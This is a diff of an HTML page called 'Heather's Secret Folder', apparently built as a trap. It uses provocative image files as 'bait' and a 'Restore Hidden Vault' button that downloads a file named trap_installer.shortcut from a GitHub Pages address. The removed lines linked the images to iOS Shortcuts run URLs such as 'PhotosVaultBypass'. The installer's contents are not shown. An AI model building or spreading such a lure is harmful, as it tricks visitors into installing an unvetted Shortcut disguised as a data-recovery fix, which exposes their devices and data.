@@ -1,29 +1,64 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <title>Heather's Secret Folder</title>
+  <meta charset="UTF-8" />
+  <title>Heather’s Secret Folder</title>
   <style>
-    body { background-color: black; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-    img { margin: 15px; border-radius: 10px; box-shadow: 0 0 15px red; }
+    body {
+      background-color: black;
+      color: white;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    h1 {
+      margin-bottom: 20px;
+    }
+    .bait {
+      margin: 10px;
+    }
+    .bait img {
+      width: 300px;
+      border: 2px solid white;
+      cursor: pointer;
+    }
+    .footer {
+      margin-top: 40px;
+    }
+    button {
+      background-color: white;
+      color: black;
+      font-weight: bold;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: grey;
+    }
   </style>
 </head>
 <body>
-  <h1>🔐 Secret Vault Recovery</h1>
-  <p>One or more hidden vault files have been recovered. Tap to view:</p>
+  <h1>📂 Heather’s Secret Folder</h1>
 
-  <!-- Clickbait images (trap bait) -->
-  <a href="shortcuts://run-shortcut?name=PhotosVaultBypass">
-    <img src="fuck.jpg" width="300" alt="Restore Hidden Vault">
-  </a><br>
-  <a href="shortcuts://run-shortcut?name=Saved%20Messages%20Restore">
-    <img src="dick.jpg" width="300" alt="Saved Messages Restore">
-  </a><br>
-  <a href="shortcuts://run-shortcut?name=Restore%20iCloud%20Data">
-    <img src="busted.gif" width="300" alt="Restore iCloud Data">
-  </a><br>
+  <div class="bait">
+    <a href="fuck.jpg"><img src="fuck.jpg" alt="fuck.jpg"></a>
+  </div>
+  <div class="bait">
+    <a href="dick.jpg"><img src="dick.jpg" alt="dick.jpg"></a>
+  </div>
+  <div class="bait">
+    <a href="busted.gif"><img src="busted.gif" alt="busted.gif"></a>
+  </div>
 
-  <!-- Real installer -->
-  <a href="https://sexylexi8787.github.io/heathers-secret-folder/trap_installer.shortcut">
-    <button style="margin-top: 20px; font-size: 18px;">🧠 Restore Hidden Vault (Fix)</button>
-  </a>
+  <div class="footer">
+    <a href="https://sexylexi8787.github.io/heathers-secret-folder/trap_installer.shortcut">
+      <button>🧠 Restore Hidden Vault</button>
+    </a>
+  </div>
 </body>
 </html>
